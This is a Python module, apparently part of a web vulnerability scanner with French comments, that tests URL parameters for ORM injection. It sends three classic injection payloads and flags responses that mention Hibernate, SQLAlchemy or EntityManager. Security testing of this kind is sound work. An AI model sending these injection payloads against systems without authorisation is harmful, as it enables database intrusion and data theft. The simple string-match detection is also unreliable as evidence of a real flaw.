#!/usr/bin/env python3
"""
⚠️ ORM Injection (CWE-564) — OWASP A05:2025
"""

from colorama import Fore, Style

class ORMInjection:
    def __init__(self, engine, aggressive=False):
        self.engine = engine
        self.aggressive = aggressive
    
    def scan(self, params):
        print(f"\n{Fore.GREEN}[⚠️ ORM INJECTION] {Style.RESET_ALL}\n")
        
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; return db.version(); var dummy='!",
        ]
        
        baseline = self.engine.get_baseline()
        vulnerabilities = []
        
        for param in params:
            print(f"  {Fore.BLUE}→ Test paramètre: {Fore.YELLOW}{param}{Style.RESET_ALL}")
            
            for payload in payloads:
                url = self.engine.build_url(param, payload)
                if not url:
                    continue
                
                try:
                    resp = self.engine.session.get(url, timeout=5)
                    
                    # 🔍 Vérifier que ce n'est pas une erreur SQL (faux positif)
                    sql_error_patterns = ['sql syntax', 'mysql error', 'pdoexception', 'sqlstate']
                    is_sql_error = any(pattern in resp.text.lower() for pattern in sql_error_patterns)
                    
                    if is_sql_error:
                        continue  # ❌ Faux positif : erreur SQL, pas ORM
                    
                    # ✅ Vraie détection ORM
                    if any(x in resp.text.lower() for x in ['hibernate', 'sqlalchemy', 'entitymanager']):
                        vuln = {
                            'type': 'orm',
                            'cwe': 'CWE-564',
                            'param': param,
                            'payload': payload,
                            'url': url,
                            'evidence': 'Vulnérabilité ORM détectée'
                        }
                        vulnerabilities.append(vuln)
                        print(f"\n    {Fore.GREEN}[💥 ORM Injection CONFIRMÉ] {Style.RESET_ALL}{param}")
                        print(f"      Payload: {payload}")
                        print(f"      URL: {url}\n")
                        break
                except:
                    continue
        
        return vulnerabilities